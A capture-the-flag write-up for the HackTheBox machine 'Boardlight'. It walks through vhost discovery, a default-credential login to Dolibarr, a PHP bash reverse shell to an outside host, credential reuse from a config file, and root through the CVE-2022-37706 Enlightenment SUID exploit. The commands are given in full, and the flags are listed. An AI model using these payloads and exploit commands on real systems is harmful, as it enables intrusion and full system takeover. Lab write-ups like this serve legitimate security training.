# CTF: Boardlight (HTB)

## Metadata

- **Target IP:** 10.129.231.37
    
- **Hostname:** board.htb / crm.board.htb
    
- **OS:** Linux (Ubuntu)
    
- **Difficulty:** Easy
    
- **Date:** 2026-02-12
    
- **Key Skills/Tools:** Nmap, FFUF, Dolibarr Exploitation, Credential Reuse, SUID Binaries, CVE-2022-37706.
    

---

## Reconnaissance

### Port Scanning

The initial scan showed only two standard entry points: SSH and HTTP.

Bash

```
nmap -p- -Pn $target -v --min-rate 1000 -oN nmap_ports.txt
```

**Key Ports:**

- **22/tcp:** SSH (OpenSSH 8.2p1)
    
- **80/tcp:** HTTP (Apache 2.4.41)
    

### Subdomain Enumeration

The main landing page didn't offer much beyond an email address: `info@board.htb`. After adding `board.htb` to `/etc/hosts`, I ran `ffuf` to look for virtual hosts and discovered a CRM instance.

Bash

```
ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ac
```

**Discovered Vhost:** `crm.board.htb`

---

## Foothold

### Dolibarr Exploitation

Navigating to `crm.board.htb` revealed a **Dolibarr 17.0.0** login page. I gained access using the default credentials **admin:admin**.

Once logged in, I navigated to the website creation module. Since Dolibarr allows PHP in certain page-building contexts, I injected a reverse shell payload into a new page:

PHP

```
<?Php system('bash -c "bash -i >& /dev/tcp/10.10.14.2/8008 0>&1"'); ?>
```

Triggering this page provided a shell as `www-data`.

---

## Credential Cracking

### Password Harvesting

Enumerating the filesystem, I located the Dolibarr configuration file at `/var/www/html/crm.board.htb/htdocs/conf/conf.php`. It contained database credentials:

- **User:** `dolibarrowner`
    
- **Password:** `serverfun2$2023!!`
    

---

## Lateral Movement

### System Access: Larissa

While the database credentials didn't provide direct access to the `dolibarr` user, I checked for local users and found `larissa`. Testing for password reuse, I successfully authenticated via SSH.

Bash

```
netexec ssh $target -u larissa -p 'serverfun2$2023!!'
```

---

## Privilege Escalation

### SUID Enumeration

I searched for binaries with the SUID bit set to identify potential escalation paths.

Bash

```
find / -type f -perm -4000 -ls 2>/dev/null
```

Among the standard binaries, several entries for **Enlightenment** stood out, specifically `/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys`.

### CVE-2022-37706 (Enlightenment LPE)

The `enlightenment_sys` utility was vulnerable to **CVE-2022-37706**, a Local Privilege Escalation flaw. The exploit relies on a path traversal/command injection vulnerability within the binary's handling of the `mount` command.

I executed the exploit by creating a malicious directory structure that tricks the SUID binary into executing a shell as root:

Bash

```
mkdir -p "/tmp/;/tmp/shell"
echo "/bin/bash" > /tmp/shell
chmod +x /tmp/shell
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/shell" /tmp///net
```

The binary executed the "mount" but processed the injected `/tmp/shell` path as a command, dropping me into a root shell.

---

## Flags

|**Flag Type**|**Value**|
|---|---|
|**User**|cc0283b348015d4c5d4d9999c19ba647|
|**Root**|0f795019c28cdf234f4ee0ff021cbb09|

---

That Enlightenment exploit is a classic example of why SUID binaries are such a high-risk surface: one small logic error in how it handles external inputs like paths, and the whole system is gone.
